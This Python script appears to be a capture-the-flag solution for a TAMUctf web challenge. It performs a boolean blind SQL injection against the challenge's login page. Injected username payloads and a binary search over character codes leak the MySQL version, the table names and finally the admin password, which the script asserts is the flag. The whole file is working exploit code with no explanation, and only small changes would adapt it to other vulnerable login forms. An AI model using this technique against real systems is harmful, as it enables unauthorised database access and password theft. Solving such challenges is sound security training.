#!/usr/bin/env python3
import requests

URL = 'http://passwordextraction.tamuctf.com'
# get admin's password by bsqli

# leak mysql version
payload = "admin' and ascii(substring(version(), {}, 1)){}{} #"
'''
5.7.29-0ubuntu0.18.04.1
'''
# leak table names
payload = "admin' and ascii(substring((select group_concat(table_name) from information_schema.tables limit 0, 1), {}, 1)){}{} #"
# user defined tables
'''
accounts,columns_pr
'''
# leak password of admin
payload = "admin' and ascii(substring((select password from accounts where username='admin'), {}, 1)){}{} #"


def request(username, password=''):
    data = {'username':username, 'password':password}
    r = requests.post(URL + '/login.php', data=data)
    return 'success' in r.text


def binarysearch(pos):
    lo, hi = 9, 126
    while True:
        mid = (lo + hi) // 2
        if request(payload.format(pos, '<', mid)):
            hi = mid - 1
        else:
            lo = mid + 1
        if lo > hi:
            break
    result = -1
    if request(payload.format(pos, '=', lo)):
        result = lo
    elif request(payload.format(pos, '=', hi)):
        result = hi
    return result


def leak(payload):
    data = ''
    pos = 1
    while True:
        result = binarysearch(pos)
        if result == -1:
            break
        data += chr(result)
        print(data)
        pos += 1
    return data

flag = leak(payload)
assert flag == 'gigem{h0peYouScr1ptedTh1s}'
print(flag)

# https://reagleval.gitbooks.io/write-up-ctf/animal-attack-200.html
# https://paiza.io/projects/hc3GQRjEhrB7QBuTYoCJbg?language=mysql
# https://hyunmini.tistory.com/59
